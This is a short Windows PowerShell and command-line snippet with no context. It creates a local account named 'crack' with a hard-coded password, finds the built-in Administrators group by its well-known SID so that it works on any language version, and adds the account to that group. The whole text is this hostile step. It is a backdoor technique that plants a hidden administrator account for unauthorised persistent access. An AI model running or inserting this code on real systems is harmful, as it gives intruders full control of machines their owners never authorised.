net user crack crack123 /add
$group = Gwmi win32_group -Filter "Domain='$env:computername' and SID='S-1-5-32-544'" 
$adm = $group.Name
net localgroup $adm crack /add